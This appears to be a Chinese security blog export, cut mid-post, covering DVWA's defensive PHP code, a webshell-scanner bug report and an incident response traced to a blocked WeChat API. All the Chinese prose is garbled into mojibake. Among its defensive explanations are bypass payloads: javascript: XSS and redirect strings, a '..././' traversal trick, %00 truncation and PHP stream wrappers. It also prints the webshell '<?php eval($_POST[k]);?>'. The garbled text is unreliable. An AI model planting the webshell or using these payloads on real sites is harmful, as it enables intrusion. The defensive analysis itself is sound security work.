?å’Œå˜é‡bindParam(1,$id);bindParam(2,$name);åˆ†ä¸¤æ¬¡å‘é€ç»™MySQLï¼Œç”±MySQLå®Œæˆå˜é‡çš„è½¬ä¹‰å¤„ç†ï¼Œç„¶åè¿›è¡Œå‚æ•°å­—ç¬¦ä¸²åŒ¹é…å³å¯ã€‚(PSï¼šä¹‹å‰è¿˜äº†è§£äº†è¯­ä¹‰åˆ†æé˜²SQLæ³¨å…¥ï¼Œä¸€ç›´è§‰å¾—PDOå¾ˆå¥½äº†ï¼Œä¸ºå•¥è¿˜è¦è¯­ä¹‰åˆ†æï¼Œåæ¥æ‰æç„¶å¤§æ‚Ÿï¼ŒPDOæ˜¯å¯¹å¼€å‘çš„ï¼Œè¯­ä¹‰åˆ†æäººå®¶æ˜¯ä¸ºäº†å–äº§å“ï¼Œmdzz)4ã€DVWAé‡Œé¢è¿˜åŠ äº†Anti-CSRF tokenéªŒè¯ï¼Œè¿›ä¸€æ­¥æé«˜äº†ç³»ç»Ÿå®‰å…¨æ€§ 0x02 XSS(è·¨ç«™è„šæœ¬)DVWAä¸­XSSé˜²æŠ¤æµç¨‹æ­¥éª¤ä»£ç å¦‚ä¸‹ï¼š12345$message = trim( $_POST[ &apos;mtxMessage&apos; ] );Sanitize message input$message = stripslashes( $message );$message = mysql_real_escape_string( $message );$message = htmlspecialchars( $message ); 1ã€ä½¿ç”¨trimå‡½æ•°ï¼Œtrimå‡½æ•°ç§»é™¤å­—ç¬¦ä¸²ä¸¤ä¾§çš„ç©ºç™½å­—ç¬¦æˆ–å…¶ä»–é¢„å®šä¹‰å­—ç¬¦ã€‚å› ä¸ºæœ‰æ—¶å€™æˆ‘ä»¬ä¼šä½¿ç”¨\tã€\nã€\r&quot;ç­‰å°è¯•ç»•è¿‡ã€‚2ã€ä½¿ç”¨stripslashes,åˆ é™¤ç”± addslashes()å‡½æ•°æ·»åŠ çš„åæ–œæ ã€‚3ã€ä½¿ç”¨mysql_real_escape_stringè½¬ä¹‰ä¸€äº›ç‰¹æ®Šçš„å­—ç¬¦ã€‚4ã€ä½¿ç”¨htmlspecialcharsæŠŠç‰¹æ®Šå­—ç¬¦&amp;,&quot;,&#39;,&lt;,&gt;æ›¿æ¢ä¸ºHTMLå®ä½“&amp;amp;&amp;quot;&amp;#039;&amp;lt;&amp;gt;,ä½†æˆ‘ä»¬è¿˜æ˜¯å¯ä»¥é€šè¿‡ç¼–ç çš„æ–¹å¼ç»•è¿‡å‡½æ•°è¿›è¡ŒXSSæ³¨å…¥ï¼Œå°¤å…¶æ˜¯DOMå‹çš„XSS123456&lt;a href=&quot;&lt;?php echo htmlspecialchars(&quot;javascript:alert(1)&quot;,ENT_QUOTES); ?&gt;&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;&lt;?php echo htmlspecialchars(&quot;javascript:location%3Dhttp%3A%2F%2Fwww.baidu.com&quot;,ENT_QUOTES); ?&gt;&quot;&gt;test&lt;/a&gt; æ€»ç»“ï¼šå¯¹è¾“å…¥(URLå‚æ•°)è¿›è¡Œè¿‡æ»¤ï¼›å¯¹è¾“å‡ºè¿›è¡Œç¼–ç ï¼›ç™½åå•å’Œé»‘åå•ç»“åˆï¼› 0x03 æ–‡ä»¶ä¸Šä¼ DVWAä¸­æ–‡ä»¶å®‰å…¨ä¸Šä¼ çš„æµç¨‹ï¼š 1ã€å–æ–‡ä»¶æœ€åçš„æ‰©å±•å1$uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, &apos;.&apos; ) + 1); 2ã€å¯¹ä¸Šä¼ æ–‡ä»¶çš„æ–‡ä»¶ååšéšæœºæ•°é‡å‘½åæ“ä½œDVWAç”¨çš„æ˜¯MD5ï¼Œrand()å‡½æ•°ä¹Ÿå¯ä»¥1$target_file = md5( uniqid() . $uploaded_name ) . &apos;.&apos; . $uploaded_ext; 3ã€é‡‡å–ç™½åå•æ–¹å¼éªŒè¯æ–‡ä»¶çš„åç¼€åï¼ŒMIME-TYPEç±»å‹ï¼Œä»¥åŠæ–‡ä»¶å¤§å°123if( ( strtolower( $uploaded_ext ) == &apos;jpg&apos; || strtolower( $uploaded_ext ) == &apos;jpeg&apos; || strtolower( $uploaded_ext ) == &apos;png&apos; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; ( $uploaded_type == &apos;image/jpeg&apos; || $uploaded_type == &apos;image/png&apos; 4ã€æ£€æŸ¥æ˜¯å¦ä¸ºçœŸæ­£å›¾ç‰‡1getimagesize( $uploaded_tmp ) 5ã€ä½¿ç”¨GDåº“æˆ–image-magickè¿›è¡ŒäºŒæ¬¡æ¸²æŸ“äºŒæ¬¡æ¸²æŸ“ï¼Œæ¸…é™¤å›¾ç‰‡ä¸­çš„æ¶æ„ä»£ç 1$img = imagecreatefromjpeg( $uploaded_tmp ); 6ã€å›æ˜¾ç›¸å¯¹è·¯å¾„1if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) DVWAä¸­åªæ˜¯ä»ä»£ç è®¾è®¡å±‚é¢è€ƒè™‘æ–‡ä»¶ä¸Šä¼ çš„å®‰å…¨æ€§ï¼Œæ¯”å¦‚è¿˜æœ‰Nginxä¸Apacheçš„è§£ææ¼æ´ï¼Œæˆªæ–­é—®é¢˜ï¼Œ.htaccess,.user.iniåé—¨,windowsç‰¹æ€§ï¼ŒADSæµï¼ŒRTLOæŠ€æœ¯ï¼ŒåŒ…å«æ¼æ´ç­‰ç­‰ã€‚ 0x04 æ–‡ä»¶åŒ…å«DVWAä¸­çš„æ–‡ä»¶åŒ…å«ç›´æ¥å†™æ­»äº†å°±é‚£å‡ ä¸ªæ–‡ä»¶ï¼Œç®€å•ç²—æš´ã€‚ã€‚ã€‚ è¿™é‡Œä¸¾ä¸€äº›éœ€è¦æ³¨æ„çš„ç‚¹ï¼š ä½¿ç”¨open_basediré…ç½®ï¼Œé™åˆ¶æ–‡ä»¶ç›®å½• è¿‡æ»¤./,æ³¨æ„ä¸æ˜¯../ï¼Œå› ä¸ºå¯ä»¥ä½¿ç”¨..././..././ç»•è¿‡ ç¦æ­¢æœåŠ¡å™¨è¿œç¨‹æ–‡ä»¶åŒ…å«,allow_url_fopen=Offä¸allow_url_include=Off æ³¨æ„php://input,data://ç­‰å„ç§ä¼ªåè®®é—®é¢˜ æ³¨æ„æˆªæ–­é—®é¢˜ï¼Œæ¯”å¦‚%00æˆªæ–­,è¶…é•¿è·¯å¾„æˆªæ–­ï¼Œç‚¹å·æˆªæ–­12345678910111213file:///var/www/html è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿftp://&lt;login&gt;:&lt;password&gt;@&lt;ftpserveraddress&gt; è®¿é—®FTP(s) URLsdata:// æ•°æ®æµhttp:// â€” è®¿é—® HTTP(s) URLsphp://input â€” è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµzlib:// â€” å‹ç¼©æµglob:// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼phar:// â€” PHP Archivessh2:// â€” Secure Shell 2rar:// â€” RARogg:// â€” Audio streamsexpect:// â€” å¤„ç†äº¤äº’å¼çš„æµphp://filter/ 0x05 å‘½ä»¤æ‰§è¡ŒDVWAä¸­æ˜¯ä»¥pingå‘½ä»¤ä¸ºä¾‹12$octet = explode( &quot;.&quot;, $target ); //ä»¥ç‚¹å·è¿›è¡Œåˆ†å‰²if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) //åˆ¤æ–­æ¯ä¸ªéƒ¨åˆ†æ˜¯å¦æ˜¯æ•°å­—ï¼ŒåŒæ—¶sizeæ˜¯å¦ä¸º4 è¿™é‡Œä¸¾ä¸€äº›éœ€è¦æ³¨æ„çš„ç‚¹ï¼š 1.å°½é‡å°‘ç”¨æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°æˆ–è€…ç›´æ¥ç¦ç”¨2.å‚æ•°å€¼å°½é‡ä½¿ç”¨å¼•å·åŒ…è£¹3.åœ¨ä½¿ç”¨åŠ¨æ€å‡½æ•°ä¹‹å‰ï¼Œç¡®ä¿ä½¿ç”¨çš„å‡½æ•°æ˜¯æŒ‡å®šçš„å‡½æ•°ä¹‹ä¸€4.åœ¨è¿›å…¥æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°ã€æ–¹æ³•ä¹‹å‰ï¼Œå¯¹å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼Œå¯¹æ•æ„Ÿå­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼ŒPHPä¸­ä½¿ç”¨escapeshellcmdå‡½æ•° escapeshellcmdå¯¹å­—ç¬¦ä¸²ä¸­å¯èƒ½ä¼šæ¬ºéª—shellå‘½ä»¤æ‰§è¡Œä»»æ„å‘½ä»¤çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ã€‚ æ­¤å‡½æ•°ä¿è¯ç”¨æˆ·è¾“å…¥çš„æ•°æ®åœ¨ä¼ é€åˆ°exec()æˆ–system()å‡½æ•°ï¼Œæˆ–è€…æ‰§è¡Œæ“ä½œç¬¦ ä¹‹å‰è¿›è¡Œè½¬ä¹‰ã€‚ ç‰¹æ®Šå­—ç¬¦æœ‰`#,&amp;,;åå¼•å·,|,*,?,~,&lt;,&gt;,^,(,),[,],{,},$,x0A,x00å’ŒxFF`ã€‚&apos;å’Œ&quot;ä»…åœ¨ä¸é…å¯¹çš„æ—¶å€™è¢«è½¬ä¹‰ã€‚åœ¨Windowså¹³å°ä¸Šä»¥å‰ç¼€`^`æ¥è½¬ä¹‰çš„ 0x06 CSRF(è·¨ç«™è¯·æ±‚ä¼ªé€ )DVWAä¸­çš„CSRFæ˜¯ä»¥æ”¹å¯†ç ä¸ºä¾‹ã€‚ 1ã€éªŒè¯tokenè¿™æ˜¯ä¸€ä¸ªéå¸¸æœ‰æ•ˆçš„æ‰‹æ®µï¼Œç”¨æˆ·æ¯æ¬¡è®¿é—®æ”¹å¯†é¡µé¢æ—¶ï¼ŒæœåŠ¡å™¨ä¼šè¿”å›ä¸€ä¸ªéšæœºçš„tokenï¼Œå‘æœåŠ¡å™¨å‘èµ·è¯·æ±‚æ—¶ï¼Œéœ€è¦æäº¤tokenå‚æ•°ï¼Œè€ŒæœåŠ¡å™¨åœ¨æ”¶åˆ°è¯·æ±‚æ—¶ï¼Œä¼šä¼˜å…ˆæ£€æŸ¥tokenï¼Œåªæœ‰tokenæ­£ç¡®ï¼Œæ‰ä¼šå¤„ç†å®¢æˆ·ç«¯çš„è¯·æ±‚ã€‚12// Check Anti-CSRF tokencheckToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); 2ã€äºŒæ¬¡ç¡®è®¤12345678910// Get input$pass_curr = $_GET[ &apos;password_current&apos; ];...// Check that the current password is correct$data = $db-&gt;prepare( &apos;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&apos; );$data-&gt;bindParam( &apos;:user&apos;, dvwaCurrentUser(), PDO::PARAM_STR );$data-&gt;bindParam( &apos;:password&apos;, $pass_curr, PDO::PARAM_STR );$data-&gt;execute();// Do both new passwords match and does the current password match the user?if( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == 1 ) )&#123;&#125; äºŒæ¬¡ç¡®è®¤å°±æ˜¯åœ¨è°ƒç”¨æŸäº›åŠŸèƒ½æ—¶è¿›è¡ŒäºŒæ¬¡éªŒè¯ï¼Œå¦‚ï¼šåˆ é™¤ç”¨æˆ·æ—¶ï¼Œäº§ç”Ÿä¸€ä¸ªæç¤ºå¯¹è¯æ¡†ï¼Œæç¤ºâ€ç¡®å®šåˆ é™¤ç”¨æˆ·å—ï¼Ÿâ€,è½¬è´¦æ“ä½œæ—¶ï¼Œè¦æ±‚ç”¨æˆ·è¾“å…¥äºŒæ¬¡å¯†ç ã€‚ 3ã€éªŒè¯ç è¿™æ˜¯ä¸€ä¸ªéå¸¸ç®€å•å¹¶ä¸”æœ‰æ•ˆçš„é˜²å¾¡CSRFçš„æ–¹æ³•ã€‚ 0x07 æš´åŠ›ç ´è§£1ã€å¢åŠ éªŒè¯ç ï¼Œtokenç­‰éªŒæ ¡å­—æ®µDVWAä¸­åŠ å…¥äº†Anti-CSRFtokené¢„é˜²æ— è„‘çˆ†ç ´ã€‚ 2ã€å¢åŠ sleepæ“ä½œåªè¦ç™»é™†å¤±è´¥ï¼Œåˆ™å»¶è¿Ÿ3ç§’ï¼Œå¤§å¤§é™ä½äº†çˆ†ç ´é€Ÿåº¦12// Login failedsleep( rand( 2, 4 ) ); 3ã€å¢åŠ ç™»é™†é”™è¯¯æœºåˆ¶å•ç”¨æˆ·ï¼Œç™»é™†æ¬¡æ•°é”™è¯¯åˆ°ä¸€å®šæ¬¡æ•°ï¼Œå³é”å®šè¯¥è´¦æˆ·ã€‚æ­¤å¤–è¿˜å¯ä»¥å¯¹ç”¨æˆ·IPç­‰è¿›è¡Œé¢‘æ¬¡é™åˆ¶ã€‚ 0x08 éªŒè¯ç éªŒè¯ç ä¸»è¦ä¼šå‡ºç°ä¸€äº›é€»è¾‘æ¼æ´ï¼Œæœ€å¸¸è§çš„æœ‰ä¸¤ç§ï¼š éªŒè¯è¿‡ç¨‹åˆ†ä¸¤æ­¥ï¼Œå…ˆéªŒè¯éªŒè¯ç æ˜¯å¦æ­£ç¡®ï¼Œæ­£ç¡®åˆ™è¿›è¡Œä¸‹ä¸€æ­¥ éªŒè¯ç æ²¡æœ‰è®¾ç½®æœ‰æ•ˆæ—¶é—´ï¼Œå¯¼è‡´å¯ä»¥é‡å¤ä½¿ç”¨ å‚è€ƒé“¾æ¥ï¼šhttp://www.jb51.net/article/56612.htmhttp://www.freebuf.com/author/lonehandhttp://www.cnblogs.com/Hyber/p/6133196.htmlhttp://www.am0s.com/functions/227.html]]></content>
      <tags>
        <tag>ç¼–ç¨‹</tag>
        <tag>PHP</tag>
        <tag>ä»£ç å®¡è®¡</tag>
        <tag>å®‰å…¨å¼€å‘</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[è®°Dç›¾_WebæŸ¥æ€ä¸­çš„ä¸€ä¸ªBug]]></title>
    <url>%2F2017%2F07%2F07%2F%E8%AE%B0D%E7%9B%BE-Web%E6%9F%A5%E6%9D%80%E4%B8%AD%E7%9A%84%E4%B8%80%E4%B8%AABug%2F</url>
    <content type="text"><![CDATA[å…¬å¸æœ€è¿‘çš„æ¥çš„é¡¹ç›®ï¼Œéœ€è¦å¯¹40000ä¸ªwebshellæ ·æœ¬åˆ†æï¼Œç”±äºæ—¶é—´ç´§ï¼Œä¹Ÿæ²¡å†™ä¸œè¥¿ï¼Œå…ˆæ‹¿Dç›¾å‡‘åˆç€ç”¨ä¸€æ¬¡å§ï¼Œè®°ä½¿ç”¨è¿‡ç¨‹ä¸­é‡åˆ°çš„ä¸€ä¸ªbugã€‚å¤§å®¶çœ‹è¿™ä¸ªå›¾ç‰‡ Dç›¾æŠ¥çš„ç­‰çº§æ‰æ˜¯â€œ1â€ï¼Œæˆ‘ä»¬çœ‹ä¸‹file_put_contentså‡½æ•°ã€‚12345678910file_put_contents(file,data,mode,context)file å¿…éœ€ã€‚è§„å®šè¦å†™å…¥æ•°æ®çš„æ–‡ä»¶ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶ã€‚data å¯é€‰ã€‚è§„å®šè¦å†™å…¥æ–‡ä»¶çš„æ•°æ®ã€‚å¯ä»¥æ˜¯å­—ç¬¦ä¸²ã€æ•°ç»„æˆ–æ•°æ®æµã€‚mode å¯é€‰ã€‚è§„å®šå¦‚ä½•æ‰“å¼€/å†™å…¥æ–‡ä»¶ã€‚å¯èƒ½çš„å€¼ï¼š FILE_USE_INCLUDE_PATH FILE_APPEND LOCK_EXcontext å¯é€‰ã€‚è§„å®šæ–‡ä»¶å¥æŸ„çš„ç¯å¢ƒã€‚ context æ˜¯ä¸€å¥—å¯ä»¥ä¿®æ”¹æµçš„è¡Œä¸ºçš„é€‰é¡¹ã€‚è‹¥ä½¿ç”¨ nullï¼Œåˆ™å¿½ç•¥ã€‚ å¾ˆæ˜æ˜¾ï¼Œè¿™ä¸ªæ–‡ä»¶çš„åå­—è¦çœ‹åç«¯æ€ä¹ˆå¤„ç†ï¼Œå¦‚æœæ˜¯æ¥æ”¶POSTå‚æ•°ä¸­çš„â€œKâ€ï¼Œé‚£å°±æ˜¯è‡ªå®šä¹‰æ–‡ä»¶åäº†ï¼Œå°±æ˜¯ä¸æ˜¯ï¼Œè‚¯å®šä¹Ÿæ˜¯ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„æ–‡ä»¶è€Œæ–‡ä»¶å†…å®¹å°±æ˜¯&lt;?php eval($_POST[k]);?&gt;ã€‚ è¿™ç§å¾ˆæ˜æ˜¾ä¸æ˜¯æ­£å¸¸æ“ä½œå•Šï¼Œä½†æ˜¯Dç›¾ç«Ÿç„¶æŠ¥ç­‰çº§ä¸ºâ€œ1â€ï¼æˆ‘ä»¬ä½¿ç”¨çš„æ—¶å€™ æœ‰æ—¶å€™ä¼šç»å¸¸å¿½ç•¥ç­‰çº§â€œ3â€ä»¥ä¸‹çš„æ–‡ä»¶ï¼Œè¿™å°±å¾ˆå±é™©å•Šã€‚ æˆ‘çŒœæµ‹ï¼šå¯èƒ½æ˜¯ç”±äºDç›¾çš„ç­–ç•¥æ˜¯åªè¦åœ¨ä»–çš„è§„åˆ™é‡Œå‡ºç°ï¼Œå°±æ˜¾ç¤ºå‡ºæ¥å‡ºç°çš„ç¬¬ä¸€æ¡çš„é‚£ä¸ªç­‰çº§ã€‚è¿™æ˜æ˜¾ä¸ç¬¦åˆå¸¸ç†å•Šï¼ æœ€èµ·ç è¦åšä¸ªå…¨æ–‡æ£€æµ‹ï¼Œç„¶åæŠŠæœ€é«˜ç­‰çº§çš„ç»™æ˜¾ç¤ºå‡ºæ¥ï¼Œè¿™æ ·ï¼Œç”¨æˆ·å†äººå·¥æ’æŸ¥ï¼Œå°±ä¸ä¼šå‡ºç°æ¼æŠ¥çš„æƒ…å†µäº†ã€‚ï¼ˆç»•çš„å’±å°±æš‚ä¸”ä¸è¯´ï¼‰]]></content>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>webshell</tag>
        <tag>åº”æ€¥å“åº”</tag>
        <tag>Dç›¾</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[è®°ä¸€æ¬¡å¥‡è‘©çš„åº”æ€¥å“åº”]]></title>
    <url>%2F2017%2F06%2F26%2F%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A5%87%E8%91%A9%E7%9A%84%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%2F</url>
    <content type="text"><![CDATA[ä¸Šä¸Šä¸Šå‘¨æœ«çœŸæ˜¯ä¸ªä¸å¹³å‡¡çš„å‘¨æœ«ï¼Œå‘¨å…­å…¬å¸ä¸¾åŠâ€œè„‰ææ¶ŒåŠ¨â€æ²™é¾™ï¼Œè™½ç„¶å¿™ç‚¹ï¼Œä½†æ˜¯ä¹Ÿæ˜¯å­¦åˆ°å¾ˆå¤šï¼Œå†µä¸”è¿˜æ˜¯è‡ªå·±ç¬¬ä¸€æ¬¡å‚åŠ å®‰å…¨ç›¸å…³çš„ä¼šè®®ã€‚ç„¶åå‘¨æœ«ä¸Šåˆèµ¶å¿™å®Œæˆå››çˆ·å®‰æ’çš„å®‰å…¨è„‰æä¸Šçš„ä»»åŠ¡ï¼Œå†™äº†ä¸ªæ–‡ç« å‘åˆ°â€œå®‰å…¨è„‰æâ€ä¸Šã€‚ä¸‹åˆåˆšè¦å‡ºå»åƒé¥­ï¼Œå·¥ä½œæ¥äº†ã€‚ã€‚ã€‚å…ˆè¯´ä¸‹è‡ªå·±åœ¨æ²™é¾™ä¸Šå­¦åˆ°çš„ URLè·³è½¬çš„æ—¶å€™å¯ä»¥ç”¨\@ç»•è¿‡ï¼Œ\æ˜¯åˆ©ç”¨æµè§ˆå™¨å’Œåç«¯è§£æå·®å¼‚ï¼Œ@è¿™ä¸ªä¹‹å‰åœ¨ssrfä¸Šç»•è¿‡ç”¨ /%0a/è¿™ç§å½¢å¼å¯ç»•è¿‡ä¸€äº›ç›®å½•é™åˆ¶ä»¥ä¾¿è¿›è¡Œå…¶ä»–æ“ä½œï¼Œä¹‹å‰éƒ½ç”¨åˆ°crlfï¼Œwafç­‰ä¸Š æœç´¢æ•æ„Ÿä¿¡æ¯å¬è¯´bingæ›´å¼ºå¤§ï¼Œå°ä¼™ä¼´è¿˜ç»™æˆ‘æ¨èäº†DuckDuckGo æ€»ç»“èµ·æ¥å°±æ˜¯ï¼šå¤ªå¹´è½»ï¼Œå¹´è½»ï¼Œè½»ã€‚ã€‚ã€‚[æ‚è„¸][æ‚è„¸][æ‚è„¸] å¥½äº†ï¼Œè¯´ä¸‹è¿™æ¬¡çš„åº”æ€¥å“åº”åŠè‡ªå·±çš„æ€è€ƒã€‚æ„Ÿè°¢åŠ è²çŒ«ã€å››çˆ·å¸¦æˆ‘ï¼Œè·ªæ‹œå•Šï¼ 0x00 äº‹ä»¶æè¿°å®¢æˆ·åé¦ˆä»6æœˆ23æ—¥å¼€å§‹ï¼Œç½‘ç«™è®¿é—®å»¶è¿Ÿå¾ˆå¤§ï¼Œé‡å¯æœåŠ¡ä¹‹åä¼šè¶Šæ¥è¶Šæ…¢ï¼Œç›´è‡³502ã€‚ç½‘ç«™ä½¿ç”¨LNMPé›†æˆç¯å¢ƒï¼ŒæœåŠ¡å™¨åŠæ•°æ®åº“ä¸æ˜¯å¼±å£ä»¤ã€‚6æœˆ25å·å®¢æˆ·ä¹°äº†ç›¸å…³å®‰å…¨äº§å“ï¼Œæœªå‘ç°æ˜æ˜¾çš„æ¶æ„æ”»å‡»è¡Œä¸ºï¼ŒåŒæ—¶æœåŠ¡å™¨æ€§èƒ½è‰¯å¥½ã€‚ 0x01 äº‹ä»¶å¤„ç†è¿‡ç¨‹é¦–å…ˆæˆ‘çš„ç¬¬ä¸€ååº”æ˜¯è¢«Däº†ï¼Œä½¿ç”¨topå‘ç°æœåŠ¡å™¨æ€§èƒ½æ­£å¸¸ã€‚ ç„¶åå®¢æˆ·ä¹Ÿä¹°äº†äº§å“ï¼Œäº§å“ä¸Šä¹Ÿæœªå‡ºç°å¼‚å¸¸ã€‚ ç„¶åä½¿ç”¨äº†ä¸‹è‡ªå·±åšçš„ä¿¡æ¯æ”¶é›†çš„linux_ä¿¡æ¯æ”¶é›†.shï¼Œæœé›†äº†ä¸‹ç›¸å…³ä¿¡æ¯ï¼ŒæŸ¥çœ‹ä¹Ÿå¹¶æ²¡å‘ç°ä»€ä¹ˆå¼‚å¸¸ã€‚ ä½¿ç”¨äº†Pythonç‰ˆçš„webshellæŸ¥æ€ï¼Œä¹ŸTMæ²¡å‘ç°å•¥ï¼Œå„ç§çœ‹æ—¥å¿—ä¹Ÿå¹¶æ²¡å‘ç°ä»€ä¹ˆåµç”¨ï¼Œè¿™TMæˆ‘å°±å´©æºƒäº†ã€‚ã€‚ã€‚ ç„¶åæˆ‘åˆè€ƒè™‘æ˜¯ä¸æ˜¯Slow HTTP DDosï¼Œä½†æ˜¯æ²¡åŠæ³•éªŒè¯å•Šã€‚ æœ¬åœ°å¤ç°çš„è¯å®¢æˆ·è‚¯å®šä¸è®©å•Šï¼Œæ— åŠ©å•Šã€‚ã€‚ã€‚ æ²¡åŠæ³•åªèƒ½ç»§ç»­åˆ†æï¼Œç„¶åäº‹ä»¶å‡ºç°äº†è½¬æœºï¼š æœåŠ¡ä¼šå‘ˆç°ä¸¤ç§æƒ…å†µï¼š httpèµ„æºæœªè¢«å å°½çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥è®¿é—®é™æ€èµ„æºä»¥åŠç›´æ¥æŸ¥sqlçš„è·¯ç”±é“¾æ¥ï¼Œå¦‚ï¼š12http://xxx/wap/test.css?v=1http://xxx/phpmyadmin/index.php httpèµ„æºå®Œå…¨è¢«å æ»¡ï¼Œå¯¼è‡´é™æ€èµ„æºéƒ½ä¸èƒ½è®¿é—®ï¼ŒæŸ¥è¯¢è¿›ç¨‹ä¼šå‘ç°æœ€å¤§50ä¸ªhttpdè¿›ç¨‹å…¨å¯åŠ¨äº†ã€‚ ç”±äºæœ€å¤§åªå…è®¸50ä¸ªè¿›ç¨‹ï¼Œæ‰€ä»¥å¯¼è‡´è¿™ä¸ªæ—¶å€™é™æ€å’ŒåŠ¨æ€çš„èµ„æºéƒ½æ— æ³•è¿›è¡Œè®¿é—®äº†ã€‚æ£€æŸ¥nginxæ—¥å¿—ï¼Œlogä¸­æœ‰å¤§é‡çš„499çŠ¶æ€ç ï¼Œè¿™ä¸ªæ˜¯ç”±äºå®¢æˆ·ç«¯ç­‰å¾…è¶…æ—¶ï¼Œå…³é—­äº†é“¾æ¥å¯¼è‡´ã€‚ æš‚ä¸”åœ¨proxy.confä¸­æ–°å¢äº†proxy_ignore_client_abort on; é‡å¯åï¼Œä¸åœ¨æœ‰å®¢æˆ·ç«¯ä¸»åŠ¨å…³é—­é“¾æ¥çš„æƒ…å†µã€‚ æ£€æŸ¥éƒ¨åˆ†é“¾æ¥æºä»£ç å‡½æ•°ï¼Œå¦‚åœ¨èµ„æºæœªå æ»¡æƒ…å†µä¸‹ï¼Œè®¿é—®æ­¤phpmyadmin/index.phpè¯·æ±‚æ˜¯æ²¡é—®é¢˜çš„ï¼š http://xxx/xxx/ajax.php å®šä½åˆ°/data/wwwroot/xxx/ajax.action.phpæ–‡ä»¶ï¼ŒæŸ¥çœ‹åå‘ç°å°±æ˜¯ä¸€ä¸ªç®€å•çš„sqlæŸ¥è¯¢ï¼Œç„¶åæ‰“å°äº†jsonã€‚ ç„¶åè®¿é—® â€œæ‰¾å›å¯†ç é“¾æ¥â€ æ¯æ¬¡å»¶è¿Ÿæ—¶é—´éƒ½åœ¨28.19ç§’å·¦å³ï¼Œå¦‚ä¸‹ï¼š http://xxx/finduser/findpassword äºæ˜¯å®šä½åˆ°è¯¥æ–¹æ³•çš„æºä»£ç å‡½æ•°ä½ç½®ï¼Œåœ¨æ¸²æŸ“æ¨¡ç‰ˆå‰ï¼Œå°è¯•die(&#39;111111&#39;);å‘ç°å¾ˆå¿«èƒ½æ˜¾ç¤º111111 12345vi ./xxx/finduser.action.php$title = &quot;æ‰¾å›å¯†ç &quot;;die(&apos;1111111&apos;);include templates(&quot;mobile/user&quot;, &quot;findpassword&quot;); è¿™è¯´æ˜æ¨¡ç‰ˆåœ¨æ¸²æŸ“å‰æ˜¯æ²¡æœ‰é—®é¢˜çš„ã€‚ ä¸Šè¾¹ä¸¤æ­¥ä¹Ÿå°±è¯´æ˜äº†ï¼š ä¸ä¼šæ˜¯æ”»å‡»çš„é€ æˆçš„ã€‚ sqlæŸ¥è¯¢æ²¡é—®é¢˜ã€‚ ä¹‹åçŒœæµ‹ä¸¤ç§æƒ…å†µï¼š å¯èƒ½æ˜¯ç¼“å­˜è¶…æ—¶ ä¹Ÿå¯èƒ½æ˜¯è¿æ¥æŸä¸ªç¬¬ä¸‰æ–¹æ¥å£è¶…æ—¶å‡ºç°çš„é—®é¢˜ é‡æ–°åˆ·æ–°é¡µé¢ï¼Œå¹¶åŒæ—¶æŸ¥çœ‹ç«¯å£syn_sendæƒ…å†µï¼Œæœç„¶å‘ç°äº†é—®é¢˜ï¼š netstat -anp|grep -i syn_sent|awk &#39;{print $5}&#39;|sort|uniq 12140.207.119.12:44358.246.220.31:443 æ¯è®¿é—®åŠ è½½æ…¢çš„é¡µé¢ï¼Œå°±ä¼šå¤šä¸€ä¸ªè¿™ä¸ªipçš„é“¾æ¥å‡ºæ¥ã€‚æµè§ˆå™¨è®¿é—®åï¼Œå‘ç°sslæ ‡è¯†æ˜¯å¾®ä¿¡çš„æ¥å£ã€‚ api.weixin.qq.com -&gt; 58.246.220.31ä¸Šè¾¹è¿™ä¸ªåœ¨æœåŠ¡å™¨ä¸Šæ˜¯pingä¸é€šçš„ã€‚æŸ¥çœ‹äº†ä¸‹æœåŠ¡å™¨ä¸Šè°ƒç”¨è¯¥apiçš„æ–‡ä»¶ã€‚ find ./ -type f -name &quot;*.php&quot;|xargs grep &quot;api.weixin.qq.com&quot; æ³¨é‡Šæ‰/xxx/jssdk.class.phpç­‰é¡µé¢ä¸­çš„api.weixin.qq.comè®¿é—®ä¸åœ¨æ…¢äº†ã€‚ è‡³æ­¤ï¼Œäº‹ä»¶é—®é¢˜å®šä½æˆåŠŸã€‚ 0x02 å®‰å…¨å»ºè®® æœ€ç®€å•çš„ï¼Œä¿®æ”¹/etc/hostsã€‚ å’Œå¾®ä¿¡æ–¹å–å¾—è”ç³»ï¼Œè§£å°å¯¹api.weixin.qq.comçš„ipé™åˆ¶ã€‚ å®šä½æ‰€æœ‰è°ƒç”¨çš„apiæ¥å£ï¼Œçœ‹çœ‹è¿˜æœ‰å“ªäº›åœ¨æœåŠ¡å™¨ä¸Šæ˜¯ä¸èƒ½è®¿é—®çš„ï¼Œå¹¶è¿›è¡Œæ›¿æ¢ã€‚ 0x03 äº‹ä»¶æ€è€ƒäº‹åæˆ‘ä»¬å’Œå®¢æˆ·äº¤æµï¼Œå®¢æˆ·åé¦ˆï¼šç”±äºä¸å¯æè¿°çš„åŸå› 